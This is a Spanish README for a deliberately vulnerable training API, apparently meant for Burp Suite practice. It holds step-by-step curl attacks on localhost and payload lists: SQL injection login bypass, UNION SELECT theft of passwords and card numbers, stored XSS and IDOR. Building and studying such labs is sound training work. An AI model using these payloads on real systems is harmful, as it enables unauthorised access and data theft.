# 🚨 API Vulnerable para Demo de Seguridad QA

Esta API está **INTENCIONALMENTE** diseñada con múltiples vulnerabilidades para propósitos educativos de testing de seguridad con Burp Suite.

## 📋 Índice
- [Instalación](#instalación)
- [Endpoints Disponibles](#endpoints-disponibles)
- [Vulnerabilidades](#vulnerabilidades)
- [Guía de Ataques](#guía-de-ataques)
- [Configuración de Burp Suite](#configuración-de-burp-suite)

## 🚀 Instalación

```bash
# Clonar el repositorio
git clone <repository-url>
cd vulnerable-api-demo

# Instalar dependencias
npm install

# Iniciar el servidor
npm start
```

El servidor estará disponible en: `http://localhost:3000`

## 🔗 Endpoints Disponibles

| Método | Endpoint | Descripción | Vulnerabilidad |
|--------|----------|-------------|----------------|
| GET | `/` | Página principal con documentación | - |
| POST | `/api/auth/login` | Login de usuarios | SQL Injection |
| GET | `/api/users` | Lista todos los usuarios | Sin autenticación |
| GET | `/api/users/:id` | Usuario por ID | SQL Injection + IDOR |
| GET | `/api/comments` | Lista comentarios | Sin autenticación |
| POST | `/api/comments` | Crear comentario | XSS |
| DELETE | `/api/comments/:id` | Eliminar comentario | SQL Injection |
| GET | `/api/search?q=` | Búsqueda | SQL Injection |
| GET | `/api/search/advanced` | Búsqueda avanzada | SQL Injection |

## 🚨 Vulnerabilidades Implementadas

### 1. **SQL Injection**
- Login sin sanitización
- Búsqueda vulnerable
- Acceso directo a tablas

### 2. **Cross-Site Scripting (XSS)**
- Comentarios sin validación
- Inyección de JavaScript

### 3. **Information Disclosure**
- Exposición de datos sensibles
- Mensajes de error detallados
- Queries SQL expuestas

### 4. **Insecure Direct Object Reference (IDOR)**
- Acceso directo a recursos sin autorización

### 5. **Missing Authentication**
- Endpoints sin verificación de autenticación

## 🎯 Guía de Ataques

### 1. **SQL Injection en Login**

#### **Paso 1: Login Normal**
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin123"
  }'
```

#### **Paso 2: SQL Injection Bypass**
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' OR '\''1'\''='\''1'\'' --",
    "password": "cualquier_cosa"
  }'
```

**Resultado:** Login exitoso sin credenciales válidas

#### **Paso 3: Extraer Todos los Usuarios**
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' UNION SELECT username,password,email,role,credit_card,phone,id FROM users --",
    "password": "cualquier_cosa"
  }'
```

### 2. **SQL Injection en Búsqueda**

#### **Paso 1: Búsqueda Normal**
```bash
curl "http://localhost:3000/api/search?q=comentario"
```

#### **Paso 2: Extraer Datos de Usuarios**
```bash
curl "http://localhost:3000/api/search?q=test'%20UNION%20SELECT%20username,password,credit_card,email,role,phone,id%20FROM%20users--"
```

#### **Paso 3: Enumerar Base de Datos**
```bash
curl "http://localhost:3000/api/search?q=test'%20UNION%20SELECT%20sql,name,type,NULL,NULL,NULL,NULL%20FROM%20sqlite_master--"
```

### 3. **XSS en Comentarios**

#### **Paso 1: Comentario Normal**
```bash
curl -X POST http://localhost:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": 1,
    "content": "Este es un comentario normal"
  }'
```

#### **Paso 2: Inyectar JavaScript**
```bash
curl -X POST http://localhost:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": 1,
    "content": "<script>alert('\''XSS Vulnerability!'\'')</script>"
  }'
```

#### **Paso 3: XSS Avanzado**
```bash
curl -X POST http://localhost:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": 1,
    "content": "<img src=x onerror=\"fetch('/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))\">"
  }'
```

### 4. **IDOR - Acceso Directo a Usuarios**

#### **Paso 1: Acceso a Usuario Propio**
```bash
curl "http://localhost:3000/api/users/1"
```

#### **Paso 2: Acceso a Otros Usuarios**
```bash
curl "http://localhost:3000/api/users/2"
curl "http://localhost:3000/api/users/3"
```

#### **Paso 3: SQL Injection en ID**
```bash
curl "http://localhost:3000/api/users/1'%20UNION%20SELECT%20username,password,credit_card,email,role,phone,id%20FROM%20users--"
```

### 5. **Information Disclosure**

#### **Paso 1: Exponer Datos Sensibles**
```bash
curl "http://localhost:3000/api/users"
```

**Resultado:** Se exponen contraseñas, tarjetas de crédito, emails

#### **Paso 2: Exponer Queries SQL**
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "invalid",
    "password": "invalid"
  }'
```

**Resultado:** Se expone la query SQL en el error

### 6. **Acceso Directo a Base de Datos**

#### **Paso 1: Enumerar Tablas**
```bash
curl "http://localhost:3000/api/search/advanced?table=sqlite_master"
```

#### **Paso 2: Acceso Directo a Usuarios**
```bash
curl "http://localhost:3000/api/search/advanced?table=users&column=username"
```

#### **Paso 3: Extraer Contraseñas**
```bash
curl "http://localhost:3000/api/search/advanced?table=users&column=password"
```

## 🛠️ Configuración de Burp Suite

### **Paso 1: Configurar Proxy**
1. Abrir Burp Suite
2. Ir a **Proxy > Options**
3. Configurar proxy en `127.0.0.1:8080`

### **Paso 2: Configurar Navegador**
1. Configurar proxy del navegador en `127.0.0.1:8080`
2. Instalar certificado de Burp Suite

### **Paso 3: Interceptar Requests**
1. Activar interceptación en **Proxy > Intercept**
2. Navegar a `http://localhost:3000`
3. Modificar requests para probar vulnerabilidades

### **Paso 4: Usar Repeater**
1. Enviar requests a **Repeater**
2. Modificar payloads
3. Enviar múltiples variaciones

## 📊 Payloads de Prueba

### **SQL Injection Payloads**
```sql
-- Bypass Login
admin' OR '1'='1' --
admin' OR 1=1 --
' OR '1'='1' --

-- Union Select
' UNION SELECT username,password,email,role,credit_card,phone,id FROM users --
' UNION SELECT sql,name,type,NULL,NULL,NULL,NULL FROM sqlite_master --

-- Error Based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a) --
```

### **XSS Payloads**
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
javascript:alert('XSS')
```

### **IDOR Payloads**
```
/api/users/1
/api/users/2
/api/users/999
/api/users/1' UNION SELECT * FROM users --
```

## 🔍 Herramientas Recomendadas

- **Burp Suite Community/Professional**
- **OWASP ZAP**
- **SQLMap** (para automatizar SQL Injection)
- **Postman** (para testing manual)

## ⚠️ Advertencias

- ⚠️ **Esta API es INTENCIONALMENTE vulnerable**
- ⚠️ **NO usar en producción**
- ⚠️ **Solo para propósitos educativos**
- ⚠️ **Usar en entorno controlado**

## 📚 Recursos Adicionales

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

## 🤝 Contribuciones

Las contribuciones son bienvenidas. Por favor:
1. Fork el proyecto
2. Crear una rama para tu feature
3. Commit tus cambios
4. Push a la rama
5. Abrir un Pull Request

---

**¡Happy Hacking! 🎯** 